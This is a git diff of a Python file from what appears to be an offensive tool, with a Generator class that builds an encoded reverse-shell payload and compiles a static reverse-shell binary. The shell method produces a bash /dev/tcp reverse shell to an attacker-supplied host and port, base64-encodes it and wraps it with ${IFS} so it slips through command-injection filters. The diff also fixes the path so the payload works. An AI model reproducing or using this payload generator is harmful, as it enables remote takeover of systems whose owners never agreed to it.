@@ -3,22 +3,35 @@ from bs4 import BeautifulSoup
 import requests
 import json
 import base64
+import os
+import subprocess
 
 class Generator:
-    def __init__():
+    def __init__(self, lhost, lport):
         pass
 
-    def shell(self, lhost, lport, s='bash'):
-        sh = f'{s} -i >& /dev_tcp/{lhost}/{lport} 0>&1'
+    @staticmethod
+    def shell(lhost, lport, s='bash'):
+        sh = f'{s} -i >& /dev/tcp/{lhost}/{lport} 0>&1'
 
-        sh_enc = base64.b64encode(sh.encode('utf-8'))
+        sh_enc = base64.b64encode(sh.encode('utf-8')).decode('utf-8')
 
         wrapped = f'echo${{IFS}}{sh_enc}|base64${{IFS}}-d|{s}'
 
         return wrapped
 
-    def bin(self):
-        pass
+    @staticmethod
+    def bin(lhost, lport):
+        compiler_args = [
+            'gcc',
+            'payloads/reverse_shell.c',
+            '-o',
+            'tmp/shell',
+            '-static',
+            f"-IP=\"{lhost}\"", f"-PORT={lport}"
+        ]
+
+        subprocess.run(compiler_args)
 
 class Monkey:
     forms = []
